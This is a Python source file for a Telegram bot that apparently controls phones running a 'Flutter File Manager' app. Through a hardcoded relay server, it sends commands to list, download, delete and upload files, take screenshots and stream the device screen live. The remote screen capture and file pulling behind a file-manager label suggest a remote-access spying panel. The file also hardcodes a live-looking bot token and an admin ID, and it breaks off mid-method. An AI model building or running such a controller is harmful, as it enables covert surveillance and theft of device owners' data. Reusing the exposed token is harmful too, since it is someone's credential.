from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
import logging
import os
import json
import asyncio

logger = logging.getLogger(__name__)

class BotCommandHandler:
    # Bot Configuration
    BOT_TOKEN = '8275823313:AAHfoseImjaz3TK_NDdRFHFI1x82qkG1rhs'
    ADMIN_ID = '5445671392'
    def __init__(self, bot_token, admin_id, user_manager, device_manager, file_operations):
        self.bot_token = bot_token
        self.admin_id = admin_id
        self.user_manager = user_manager
        self.device_manager = device_manager
        self.file_operations = file_operations
        logger.info(f"Initializing BotCommandHandler with bot_token: {bool(bot_token)}")
        self.application = Application.builder().token(bot_token).build() if bot_token else None
        logger.info(f"Application created: {bool(self.application)}")
        if self.application:
            self._setup_handlers()
            logger.info("Handlers set up successfully")
        else:
            logger.error("Failed to create application - bot_token may be invalid or missing")

    def _setup_handlers(self):
        """Setup command and message handlers"""
        # Command handlers
        self.application.add_handler(CommandHandler("start", self._start_command))
        self.application.add_handler(CommandHandler("help", self._help_command))
        self.application.add_handler(CommandHandler("devices", self._devices_command))
        self.application.add_handler(CommandHandler("users", self._users_command))
        self.application.add_handler(CommandHandler("adduser", self._add_user_command))
        self.application.add_handler(CommandHandler("removeuser", self._remove_user_command))
        self.application.add_handler(CommandHandler("list", self._list_command))
        self.application.add_handler(CommandHandler("download", self._download_command))
        self.application.add_handler(CommandHandler("delete", self._delete_command))
        self.application.add_handler(CommandHandler("search", self._search_command))
        self.application.add_handler(CommandHandler("status", self._status_command))
        # Add new enhanced commands
        self.application.add_handler(CommandHandler("screenshot", self._screenshot_command))
        self.application.add_handler(CommandHandler("upload", self._upload_command))
        self.application.add_handler(CommandHandler("screenview", self._screenview_command))
        self.application.add_handler(CommandHandler("navigate", self._navigate_command))
        self.application.add_handler(CommandHandler("fileops", self._fileops_command))
        
        # Message handler for non-command messages
        self.application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self._handle_text_message))
        
        # Add a simple echo command for testing
        self.application.add_handler(CommandHandler("echo", self._echo_command))
        
        # Add menu command for easier navigation
        self.application.add_handler(CommandHandler("menu", self._menu_command))
        
        # Add callback query handler for button interactions
        self.application.add_handler(CallbackQueryHandler(self._button_callback))

    async def initialize(self):
        """Initialize the bot application"""
        logger.info("Initializing bot application")
        if self.application:
            await self.application.initialize()
            logger.info("Bot application initialized successfully")
        else:
            logger.error("Cannot initialize bot application - application is None")

    async def process_update(self, update_data):
        """Process incoming update from Telegram"""
        try:
            if self.application:
                # Let the telegram library handle the update properly
                update = Update.de_json(update_data, self.application.bot)
                if update:
                    await self.application.process_update(update)
                else:
                    logger.error("Failed to convert update data to Update object")
            else:
                logger.error("Application is None, cannot process update")
        except Exception as e:
            logger.error(f"Error processing update: {e}")

    async def _check_authorization(self, update) -> bool:
        """Check if user is authorized"""
        # Handle both Update and CallbackQuery objects
        if hasattr(update, 'effective_user'):
            # This is an Update object
            user_id = str(update.effective_user.id)
        elif hasattr(update, 'from_user'):
            # This is a CallbackQuery object
            user_id = str(update.from_user.id)
        else:
            # Unknown object type
            logger.error("Unknown update type in _check_authorization")
            return False
            
        is_authorized = self.user_manager.is_authorized(user_id)
        if not is_authorized:
            # Handle both Update and CallbackQuery objects for reply
            if hasattr(update, 'message') and hasattr(update.message, 'reply_text'):
                await update.message.reply_text("You are not authorized to use this bot. Please contact the administrator.")
            elif hasattr(update, 'edit_message_text'):
                await update.edit_message_text("You are not authorized to use this bot. Please contact the administrator.")
            return False
        return True

    async def _start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /start command - Start with device selection"""
        if not await self._check_authorization(update):
            return

        # Show device selection menu
        await self._show_device_selection_menu(update)

    async def _show_device_selection_menu(self, update):
        """Show device selection menu with all registered devices"""
        devices = self.device_manager.get_all_devices()

        if not devices:
            await update.message.reply_text("📱 *No Devices Found*\n\n"
                                          "No devices are currently registered with this bot.\n"
                                          "Install the Flutter File Manager app and register a device first.", parse_mode='Markdown')
            return

        # Create device buttons
        keyboard = []
        for device_id, device_info in devices.items():
            status = "🟢 Online" if device_info.get('online_status', False) else "🔴 Offline"
            device_name = device_info.get('device_name', f'Device_{device_id[-6:]}')

            # Create button text with truncated device name
            button_text = f"{status} {device_name[:20]}..."
            device_button = InlineKeyboardButton(button_text, callback_data=f"device:{device_id}")
            keyboard.append([device_button])

        # Add refresh and help buttons
        keyboard.append([
            InlineKeyboardButton("🔄 Refresh", callback_data="refresh_devices"),
            InlineKeyboardButton("ℹ️ Help", callback_data="help_start")
        ])

        reply_markup = InlineKeyboardMarkup(keyboard)

        message = "📱 *Device Selection* 📱\n\n"
        message += f"Found {len(devices)} registered device(s).\n"
        message += "Select a device to manage:"
        message += "\n\n🟢 Online devices\n🔴 Offline devices"

        await update.message.reply_text(message, parse_mode='Markdown', reply_markup=reply_markup)

    async def _help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /help command"""
        if not await self._check_authorization(update):
            return
            
        user_id = str(update.effective_user.id)
        is_admin = self.user_manager.is_admin(user_id)
        
        message = "📱 *Flutter File Manager - Help*\n\n"
        message += "This bot allows you to manage files remotely.\n\n"
        
        message += "📁 *File Operations*\n"
        message += "• /list <path> - List directory contents (default: current directory)\n"
        message += "• /search <query> - Search for files by name\n"
        message += "• /download <file_path> - Download a file\n"
        message += "• /delete <file_path> - Delete a file\n\n"
        
        message += "📊 *Device Management*\n"
        message += "• /status - Show device status\n"
        
        if is_admin:
            message += "• /devices - List all registered devices\n\n"
            message += "👥 *User Management* (Admin only)\n"
            message += "• /users - List all authorized users\n"
            message += "• /adduser <user_id> - Add authorized user\n"
            message += "• /removeuser <user_id> - Remove authorized user\n\n"
        else:
            message += "\n"
            
        message += "ℹ️ *Other Commands*\n"
        message += "• /menu - Show interactive menu\n"
        message += "• /help - Show this help message\n"
        message += "• /status - Bot status\n\n"
        
        message += "*Tips:*\n"
        message += "• Use quotes around paths with spaces\n"
        message += "• File paths are relative to the bot's root directory\n"
        
        await update.message.reply_text(message, parse_mode='Markdown')

    async def _devices_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /devices command"""
        if not await self._check_authorization(update):
            return
            
        user_id = str(update.effective_user.id)
        if not self.user_manager.is_admin(user_id):
            await update.message.reply_text("🔐 Only admin can list devices.")
            return
        
        devices = self.device_manager.get_all_devices()
        if not devices:
            await update.message.reply_text("📱 No devices registered.")
            return
            
        message = "📱 *Registered Devices*\n\n"
        for device_id, device_info in devices.items():
            status = "🟢 Online" if device_info.get('online_status', False) else "🔴 Offline"
            last_seen = device_info.get('last_seen', 'Never')
            registration_date = device_info.get('registration_date', 'Unknown')
            message += f"🔹 *{device_info.get('device_name', 'Unnamed')}*\n"
            message += f"   ID: `{device_id}`\n"
            message += f"   Status: {status}\n"
            message += f"   Last seen: {last_seen}\n"
            message += f"   Registered: {registration_date}\n\n"
        
        await update.message.reply_text(message, parse_mode='Markdown')

    async def _users_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /users command"""
        if not await self._check_authorization(update):
            return
            
        user_id = str(update.effective_user.id)
        if not self.user_manager.is_admin(user_id):
            await update.message.reply_text("🔐 Only admin can list users.")
            return
        
        users = self.user_manager.get_all_users()
        if not users:
            await update.message.reply_text("👥 No users registered.")
            return
            
        message = "👥 *Authorized Users*\n\n"
        for user_id, user_info in users.items():
            role = user_info.get('role', 'user')
            last_active = user_info.get('last_active', 'Never')
            message += f"🔹 *User ID:* `{user_id}`\n"
            message += f"   Role: {role}\n"
            message += f"   Last active: {last_active}\n\n"
        
        await update.message.reply_text(message, parse_mode='Markdown')

    async def _add_user_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /adduser command"""
        if not await self._check_authorization(update):
            return
            
        user_id = str(update.effective_user.id)
        if not self.user_manager.is_admin(user_id):
            await update.message.reply_text("🔐 Only admin can add users.")
            return
        
        args = context.args
        if not args:
            await update.message.reply_text("📝 Please provide a user ID to add.\n\n*Usage:* `/adduser <user_id>`", parse_mode='Markdown')
            return
        
        new_user_id = args[0]
        try:
            if self.user_manager.add_user(new_user_id, 'user'):
                await update.message.reply_text(f"✅ User `{new_user_id}` added successfully.", parse_mode='Markdown')
            else:
                await update.message.reply_text(f"❌ Failed to add user `{new_user_id}`.", parse_mode='Markdown')
        except Exception as e:
            logger.error(f"Error adding user {new_user_id}: {e}")
            await update.message.reply_text(f"❌ Error adding user: {str(e)}")

    async def _remove_user_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /removeuser command"""
        if not await self._check_authorization(update):
            return
            
        user_id = str(update.effective_user.id)
        if not self.user_manager.is_admin(user_id):
            await update.message.reply_text("🔐 Only admin can remove users.")
            return
        
        args = context.args
        if not args:
            await update.message.reply_text("📝 Please provide a user ID to remove.\n\n*Usage:* `/removeuser <user_id>`", parse_mode='Markdown')
            return
        
        remove_user_id = args[0]
        try:
            if self.user_manager.remove_user(remove_user_id):
                await update.message.reply_text(f"✅ User `{remove_user_id}` removed successfully.", parse_mode='Markdown')
            else:
                await update.message.reply_text(f"❌ Failed to remove user `{remove_user_id}`.", parse_mode='Markdown')
        except Exception as e:
            logger.error(f"Error removing user {remove_user_id}: {e}")
            await update.message.reply_text(f"❌ Error removing user: {str(e)}")

    async def _list_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /list command"""
        if not await self._check_authorization(update):
            return
            
        args = context.args
        path = args[0] if args else "."
        try:
            files = self.file_operations.list_directory(path)
            if not files:
                await update.message.reply_text(f"📂 No files found in `{path}`", parse_mode='Markdown')
                return
                
            message = f"📂 *Files in {path}*\n\n"
            for file in files[:30]:  # Limit to 30 files to avoid message size limits
                message += f"• {file}\n"
            
            if len(files) > 30:
                message += f"\n... and {len(files) - 30} more files"
                
            await update.message.reply_text(message, parse_mode='Markdown')
        except FileNotFoundError as e:
            await update.message.reply_text(f"❌ Directory not found: `{path}`", parse_mode='Markdown')
        except NotADirectoryError as e:
            await update.message.reply_text(f"❌ Path is not a directory: `{path}`", parse_mode='Markdown')
        except Exception as e:
            logger.error(f"Error listing directory {path}: {e}")
            await update.message.reply_text(f"❌ Error listing directory: {str(e)}")

    async def _download_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /download command"""
        if not await self._check_authorization(update):
            return
            
        args = context.args
        if not args:
            await update.message.reply_text("📝 Please provide a file path.\n\n*Usage:* `/download <file_path>`", parse_mode='Markdown')
            return
            
        file_path = args[0]
        try:
            if self.file_operations.file_exists(file_path):
                full_path = os.path.join(self.file_operations.base_path, file_path)
                # Send the actual file
                await update.message.reply_document(document=open(full_path, 'rb'), filename=os.path.basename(file_path))
            else:
                await update.message.reply_text(f"❌ File not found: `{file_path}`", parse_mode='Markdown')
        except Exception as e:
            logger.error(f"Error downloading file {file_path}: {e}")
            await update.message.reply_text(f"❌ Error downloading file: {str(e)}")

    async def _delete_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /delete command"""
        if not await self._check_authorization(update):
            return
            
        args = context.args
        if not args:
            await update.message.reply_text("📝 Please provide a file path.\n\n*Usage:* `/delete <file_path>`", parse_mode='Markdown')
            return
            
        file_path = args[0]
        try:
            if self.file_operations.file_exists(file_path):
                self.file_operations.delete_file(file_path)
                await update.message.reply_text(f"🗑️ File deleted: `{file_path}`", parse_mode='Markdown')
            else:
                await update.message.reply_text(f"❌ File not found: `{file_path}`", parse_mode='Markdown')
        except Exception as e:
            logger.error(f"Error deleting file {file_path}: {e}")
            await update.message.reply_text(f"❌ Error deleting file: {str(e)}")

    async def _search_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /search command"""
        if not await self._check_authorization(update):
            return
            
        args = context.args
        if not args:
            await update.message.reply_text("📝 Please provide a search query.\n\n*Usage:* `/search <query>`", parse_mode='Markdown')
            return
            
        query = ' '.join(args)
        try:
            results = self.file_operations.search_files(query, ".")
            if not results:
                await update.message.reply_text(f"🔍 No files found matching: `{query}`", parse_mode='Markdown')
                return
                
            message = f"🔍 *Search results for '{query}'*\n\n"
            for file in results[:15]:  # Limit to 15 files
                message += f"• {file}\n"
            
            if len(results) > 15:
                message += f"\n... and {len(results) - 15} more files"
                
            await update.message.reply_text(message, parse_mode='Markdown')
        except Exception as e:
            logger.error(f"Error searching for {query}: {e}")
            await update.message.reply_text(f"❌ Error searching files: {str(e)}")

    async def _status_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /status command"""
        if not await self._check_authorization(update):
            return
            
        user_id = str(update.effective_user.id)
        is_admin = self.user_manager.is_admin(user_id)
        
        message = "✅ *Bot Status*\n\n"
        message += "📱 Bot is running and operational\n"
        
        if is_admin:
            # Add admin-specific status information
            users_count = len(self.user_manager.get_all_users())
            devices_count = len(self.device_manager.get_all_devices())
            message += f"\n📊 *Statistics*\n"
            message += f"• Users: {users_count}\n"
            message += f"• Devices: {devices_count}\n"
        
        await update.message.reply_text(message, parse_mode='Markdown')

    async def _handle_text_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle text messages"""
        if not await self._check_authorization(update):
            return
        await update.message.reply_text("📱 I only respond to commands. Type /help for available commands.")

    async def _echo_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /echo command for testing"""
        if not await self._check_authorization(update):
            return
            
        args = context.args
        if not args:
            await update.message.reply_text("📝 Please provide text to echo.\n\n*Usage:* `/echo <text>`", parse_mode='Markdown')
            return
            
        text = ' '.join(args)
        logger.info(f"Echoing text: {text}")
        await update.message.reply_text(f"🔁 Echo: {text}")

    async def _button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle button callbacks"""
        query = update.callback_query
        
        # Prevent double-click by answering immediately
        try:
            await query.answer()
        except Exception as e:
            logger.warning(f"Failed to answer callback query: {e}")
            return
        
        # Get the button data
        data = query.data
        
        # Handle different button actions
        if data.startswith("device:"):
            device_id = data[7:]  # Remove "device:" prefix
            await self._handle_device_selection(query, device_id)
        elif data == "refresh_devices":
            await self._handle_refresh_devices(query)
        elif data == "help_start":
            await self._show_start_help(query)
        elif data == "back_to_devices":
            await self._show_device_operation_menu(query)
        elif data == "main_menu":
            await self._show_main_menu(query)
        elif data == "file_operations":
            await self._show_file_operations_menu(query)
        elif data == "device_management":
            await self._show_device_management_menu(query)
        elif data == "user_management":
            await self._show_user_management_menu(query)
        elif data == "help_info":
            await self._show_help_menu(query)
        elif data.startswith("list:"):
            path = data[5:]  # Remove "list:" prefix
            await self._list_files_from_button(query, path)
        elif data.startswith("search:"):
            query_text = data[7:]  # Remove "search:" prefix
            await self._search_files_from_button(query, query_text)
        elif data == "status":
            await self._status_command_from_button(query)
        elif data == "devices":
            await self._devices_command_from_button(query)
        elif data == "users":
            await self._users_command_from_button(query)
        elif data == "screenshot":
            await self._handle_screenshot_button(query)
        elif data == "screenview":
            await self._handle_screenview_button(query)
        elif data == "upload":
            await self._handle_upload_button(query)
        elif data == "navigate":
            await self._handle_navigate_button(query)
        elif data == "delete":
            await self._handle_delete_button(query)
        else:
            await query.edit_message_text("❓ Unknown action")

    async def _show_main_menu(self, query):
        """Show main menu with inline buttons"""
        keyboard = [
            [InlineKeyboardButton("📁 File Operations", callback_data="file_operations")],
            [InlineKeyboardButton("📊 Device Management", callback_data="device_management")],
            [InlineKeyboardButton("👥 User Management", callback_data="user_management")],
            [InlineKeyboardButton("ℹ️ Help & Info", callback_data="help_info")],
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        message = "📱 *Flutter File Manager - Main Menu*\n\n"
        message += "Select an option below to navigate:"
        
        await query.edit_message_text(message, parse_mode='Markdown', reply_markup=reply_markup)

    async def _show_file_operations_menu(self, query):
        """Show file operations menu"""
        keyboard = [
            [InlineKeyboardButton("📋 List Files", callback_data="list:.")],
            [InlineKeyboardButton("🔍 Search Files", callback_data="search:")],
            [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")],
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        message = "📁 *File Operations*\n\n"
        message += "Select an operation:"
        
        await query.edit_message_text(message, parse_mode='Markdown', reply_markup=reply_markup)

    async def _show_device_management_menu(self, query):
        """Show device management menu"""
        keyboard = [
            [InlineKeyboardButton("📊 Device Status", callback_data="status")],
            [InlineKeyboardButton("📱 Registered Devices", callback_data="devices")],
            [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")],
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        message = "📊 *Device Management*\n\n"
        message += "Select an option:"
        
        await query.edit_message_text(message, parse_mode='Markdown', reply_markup=reply_markup)

    async def _show_user_management_menu(self, query):
        """Show user management menu"""
        # Check if user is admin
        user_id = str(query.from_user.id)
        is_admin = self.user_manager.is_admin(user_id)
        
        if not is_admin:
            await query.edit_message_text("🔐 Only admin can access user management.")
            return
        
        keyboard = [
            [InlineKeyboardButton("👥 List Users", callback_data="users")],
            [InlineKeyboardButton("➕ Add User", callback_data="add_user")],
            [InlineKeyboardButton("➖ Remove User", callback_data="remove_user")],
            [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")],
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        message = "👥 *User Management*\n\n"
        message += "Select an option:"
        
        await query.edit_message_text(message, parse_mode='Markdown', reply_markup=reply_markup)

    async def _show_help_menu(self, query):
        """Show help menu"""
        keyboard = [
            [InlineKeyboardButton("📚 Commands Help", callback_data="help")],
            [InlineKeyboardButton("ℹ️ Bot Status", callback_data="status")],
            [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")],
        ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        message = "ℹ️ *Help & Info*\n\n"
        message += "Select an option:"
        
        await query.edit_message_text(message, parse_mode='Markdown', reply_markup=reply_markup)

    async def _list_files_from_button(self, query, path):
        """List files from button callback"""
        try:
            files = self.file_operations.list_directory(path)
            if not files:
                message = f"📂 No files found in `{path}`"
            else:
                message = f"📂 *Files in {path}*\n\n"
                for file in files[:30]:  # Limit to 30 files
                    message += f"• {file}\n"
                
                if len(files) > 30:
                    message += f"\n... and {len(files) - 30} more files"
            
            # Add back button
            keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="file_operations")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await query.edit_message_text(message, parse_mode='Markdown', reply_markup=reply_markup)
        except Exception as e:
            await query.edit_message_text(f"❌ Error listing directory: {str(e)}")

    async def _search_files_from_button(self, query, query_text):
        """Search files from button callback"""
        try:
            results = self.file_operations.search_files(query_text, ".")
            if not results:
                message = f"🔍 No files found matching: `{query_text}`"
            else:
                message = f"🔍 *Search results for '{query_text}'*\n\n"
                for file in results[:15]:  # Limit to 15 files
                    message += f"• {file}\n"
                
                if len(results) > 15:
                    message += f"\n... and {len(results) - 15} more files"
            
            # Add back button
            keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="file_operations")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await query.edit_message_text(message, parse_mode='Markdown', reply_markup=reply_markup)
        except Exception as e:
            await query.edit_message_text(f"❌ Error searching files: {str(e)}")

    async def _status_command_from_button(self, query):
        """Show status from button callback"""
        user_id = str(query.from_user.id)
        is_admin = self.user_manager.is_admin(user_id)
        
        message = "✅ *Bot Status*\n\n"
        message += "📱 Bot is running and operational\n"
        
        if is_admin:
            # Add admin-specific status information
            users_count = len(self.user_manager.get_all_users())
            devices_count = len(self.device_manager.get_all_devices())
            message += f"\n📊 *Statistics*\n"
            message += f"• Users: {users_count}\n"
            message += f"• Devices: {devices_count}\n"
        
        # Add back button
        keyboard = [
            [InlineKeyboardButton("⬅️ Back", callback_data="main_menu")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(message, parse_mode='Markdown', reply_markup=reply_markup)

    async def _devices_command_from_button(self, query):
        """Show devices from button callback"""
        user_id = str(query.from_user.id)
        if not self.user_manager.is_admin(user_id):
            await query.edit_message_text("🔐 Only admin can list devices.")
            return
        
        devices = self.device_manager.get_all_devices()
        if not devices:
            message = "📱 No devices registered."
        else:
            message = "📱 *Registered Devices*\n\n"
            for device_id, device_info in devices.items():
                status = "🟢 Online" if device_info.get('online_status', False) else "🔴 Offline"
                last_seen = device_info.get('last_seen', 'Never')
                registration_date = device_info.get('registration_date', 'Unknown')
                message += f"🔹 *{device_info.get('device_name', 'Unnamed')}*\n"
                message += f"   ID: `{device_id}`\n"
                message += f"   Status: {status}\n"
                message += f"   Last seen: {last_seen}\n"
                message += f"   Registered: {registration_date}\n\n"
        
        # Add back button
        keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="device_management")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(message, parse_mode='Markdown', reply_markup=reply_markup)

    async def _users_command_from_button(self, query):
        """Show users from button callback"""
        user_id = str(query.from_user.id)
        if not self.user_manager.is_admin(user_id):
            await query.edit_message_text("🔐 Only admin can list users.")
            return
        
        users = self.user_manager.get_all_users()
        if not users:
            message = "👥 No users registered."
        else:
            message = "👥 *Authorized Users*\n\n"
            for user_id, user_info in users.items():
                role = user_info.get('role', 'user')
                last_active = user_info.get('last_active', 'Never')
                message += f"🔹 *User ID:* `{user_id}`\n"
                message += f"   Role: {role}\n"
                message += f"   Last active: {last_active}\n\n"
        
        # Add back button
        keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="user_management")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(message, parse_mode='Markdown', reply_markup=reply_markup)
    async def _menu_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /menu command to show interactive menu"""
        if not await self._check_authorization(update):
            return

        # Show main menu with buttons
        await self._show_main_menu_from_command(update)

    async def _screenshot_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /screenshot command"""
        if not await self._check_authorization(update):
            return

        args = context.args
        device_id = args[0] if args else None

        if not device_id:
            await update.message.reply_text("📝 Please specify device ID.\n\n*Usage:* `/screenshot <device_id>`", parse_mode='Markdown')
            return

        # Send command to device via HTTP
        await self._send_device_command(device_id, 'screenshot', {}, update)

    async def _upload_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /upload command to upload files to device"""
        if not await self._check_authorization(update):
            return

        args = context.args
        if len(args) < 3:
            await update.message.reply_text("📝 Please provide device ID and file details.\n\n*Usage:* `/upload <device_id> <local_file_id> <destination_path>`", parse_mode='Markdown')
            return

        device_id = args[0]
        file_id = args[1]
        destination_path = ' '.join(args[2:])

        try:
            # Download file from Telegram
            file_response = await self.application.bot.get_file(file_id)
            file_url = f"https://api.telegram.org/file/bot{self.bot_token}/{file_response.file_path}"

            # Send upload command to device
            await self._send_device_command(device_id, 'upload', {
                'file_url': file_url,
                'destination_path': destination_path,
                'file_name': file_response.file_path.split('/')[-1]
            }, update)

        except Exception as e:
            await update.message.reply_text(f"❌ Error uploading file: {str(e)}")

    async def _screenview_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /screenview command for live screen viewing"""
        if not await self._check_authorization(update):
            return

        args = context.args
        device_id = args[0] if args else None

        if not device_id:
            await update.message.reply_text("📝 Please specify device ID.\n\n*Usage:* `/screenview <device_id>`", parse_mode='Markdown')
            return

        # Send screen view command to device
        await self._send_device_command(device_id, 'live_screen', {}, update)
        await update.message.reply_text("📺 Live screen viewing started. Device will stream screen updates.", parse_mode='Markdown')

    async def _navigate_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /navigate command for device file navigation"""
        if not await self._check_authorization(update):
            return

        args = context.args
        if len(args) < 2:
            await update.message.reply_text("📝 Please specify device ID and path.\n\n*Usage:* `/navigate <device_id> <directory_path>`", parse_mode='Markdown')
            return

        device_id = args[0]
        directory_path = ' '.join(args[1:])

        # Send navigate command to device
        await self._send_device_command(device_id, 'navigate', {'path': directory_path}, update)

    async def _fileops_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /fileops command for direct file operations"""
        if not await self._check_authorization(update):
            return

        args = context.args
        if len(args) < 3:
            await update.message.reply_text("📝 Please specify operation, device ID, and parameters.\n\n*Usage:*\n"
                                          "`/fileops <device_id> list <path>`\n"
                                          "`/fileops <device_id> search <query>`\n"
                                          "`/fileops <device_id> download <file_path>`\n"
                                          "`/fileops <device_id> delete <file_path>`", parse_mode='Markdown')
            return

        device_id = args[0]
        operation = args[1]
        parameters = ' '.join(args[2:])

        # Send file operation command to device
        await self._send_device_command(device_id, operation, {'params': parameters}, update)

    async def _send_device_command(self, device_id, command, params, update_or_query):
        """Send command to device via HTTP"""
        try:
            import requests

            # Check if device exists
            device = self.device_manager.get_device(device_id)
            if not device:
                if hasattr(update_or_query, 'message') and hasattr(update_or_query.message, 'reply_text'):
                    await update_or_query.message.reply_text(f"❌ Device `{device_id}` not found.", parse_mode='Markdown')
                elif hasattr(update_or_query, 'edit_message_text'):
                    await update_or_query.edit_message_text(f"❌ Device `{device_id}` not found.", parse_mode='Markdown')
                return

            # Extract user ID and timestamp based on object type
            if hasattr(update_or_query, 'effective_user'):
                # This is an Update object
                user_id = str(update_or_query.effective_user.id)
                timestamp = str(update_or_query.message.date) if hasattr(update_or_query, 'message') else ''
            elif hasattr(update_or_query, 'from_user'):
                # This is a CallbackQuery object
                user_id = str(update_or_query.from_user.id)
                timestamp = str(update_or_query.message.date) if hasattr(update_or_query, 'message') else ''
            else:
                user_id = ''
                timestamp = ''

            # Send command to bot server which will forward to device
            response = requests.post(
                f'https://bot-ugkn.onrender.com/command',
                json={
                    'device_id': device_id,
                    'command': command,
                    'params': params,
                    'chat_id': user_id,
                    'timestamp': timestamp
                }
            )

            if response.status_code == 200:
                response_data = response.json()
                if response_data.get('success', False):
                    message = f"✅ Command `{command}` sent to device `{device_id}`\n\n"
                    message += "⏳ Waiting for device response..."
                else:
                    message = f"❌ Failed to send command to device `{device_id}`\n\n"
                    message += f"Error: {response_data.get('message', 'Unknown error')}"
                    
                if hasattr(update_or_query, 'message') and hasattr(update_or_query.message, 'reply_text'):
                    await update_or_query.message.reply_text(message, parse_mode='Markdown')
                elif hasattr(update_or_query, 'edit_message_text'):
                    await update_or_query.edit_message_text(message, parse_mode='Markdown')
            else:
                error_message = f"❌ Failed to send command: {response.text}"
                if hasattr(update_or_query, 'message') and hasattr(update_or_query.message, 'reply_text'):
                    await update_or_query.message.reply_text(error_message)
                elif hasattr(update_or_query, 'edit_message_text'):
                    await update_or_query.edit_message_text(error_message)

        except Exception as e:
            error_message = f"❌ Error sending command: {str(e)}"
            if hasattr(update_or_query, 'message') and hasattr(update_or_query.message, 'reply_text'):
                await update_or_query.message.reply_text(error_message)
            elif hasattr(update_or_query, 'edit_message_text'):
                await update_or_query.edit_message_text(error_message)

    async def _handle_device_selection(self, query, device_id):
        """Handle device selection from button"""
        # Check if device exists
        device = self.device_manager.get_device(device_id)
        if not device:
            await query.edit_message_text("❌ Device not found.")
            return

        # Store selected device in user context (could use context or database)
        self.selected_device = device_id

        # Show device operations menu
        await self._show_device_operation_menu(query, device_id, device)

    async def _show_device_operation_menu(self, query, device_id=None, device_info=None):
        """Show operations menu for selected device"""
        if device_id is None:
            device_id = getattr(self, 'selected_device', None)
            if device_id:
                device = self.device_manager.get_device(device_id)
                if device:
                    device_info = device

        if not device_id or not device_info:
            await query.edit_message_text("❌ No device selected.")
            return

        device_name = device_info.get('device_name', f'Device_{device_id[-6:]}')
        status = "🟢 Online" if device_info.get('online_status', False) else "🔴 Offline"

        # Create operation buttons
        keyboard = [
            [InlineKeyboardButton("📸 Screenshot", callback_data="screenshot")],
            [InlineKeyboardButton("📺 Screen View", callback_data="screenview")],
            [InlineKeyboardButton("📁 File Browser", callback_data="navigate")],
            [InlineKeyboardButton("⬆️ Upload File", callback_data="upload")],
            [InlineKeyboardButton("🗑️ Delete File", callback_data="delete")],
            [InlineKeyboardButton("📊 Device Status", callback_data="status")],
            [InlineKeyboardButton("🔄 Refresh", callback_data="refresh_devices")],
            [InlineKeyboardButton("⬅️ Change Device", callback_data="back_to_devices")]
        ]

        reply_markup = InlineKeyboardMarkup(keyboard)

        message = f"📱 *Device: {device_name}*\n"
        message += f"Status: {status}\n\n"
        message += "Select an operation:"

        await query.edit_message_text(message, parse_mode='Markdown', reply_markup=reply_markup)

    async def _handle_refresh_devices(self, query):
        """Refresh device list"""
        await self._show_device_selection_menu(query.message)

    async def _show_start_help(self, query):
        """Show help for start screen"""
        message = "📱 *Device Selection Help*\n\n"
        message += "🟢 Online devices - Ready for commands\n"
        message += "🔴 Offline devices - Commands may be delayed\n\n"
        message += "Select a device to access:\n"
        message += "• 📸 Screenshot - Capture device screen\n"
        message += "• 📺 Screen View - Live viewing\n"
        message += "• 📁 File Browser - Navigate files\n"
        message += "• ⬆️ Upload - Send files to device\n"
        message += "• 🗑️ Delete - Remove files\n"
        message += "• 📊 Status - Device information\n\n"
        message += "*Commands to use:*\n"
        message += "/start - Show device selection"

        keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="back_to_devices")]]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await query.edit_message_text(message, parse_mode='Markdown', reply_markup=reply_markup)

    # Button handlers for device operations
    async def _handle_screenshot_button(self, query):
        """Handle screenshot button"""
        device_id = getattr(self, 'selected_device', None)
        if not device_id:
            await query.edit_message_text("❌ No device selected.")
            return

        await self._send_device_command(device_id, 'screenshot', {}, query)
        await query.edit_message_text("📸 Screenshot command sent!\n\nThe device will capture and send a screenshot.", parse_mode='Markdown')

    async def _handle_screenview_button(self, query):
        """Handle screen view button"""
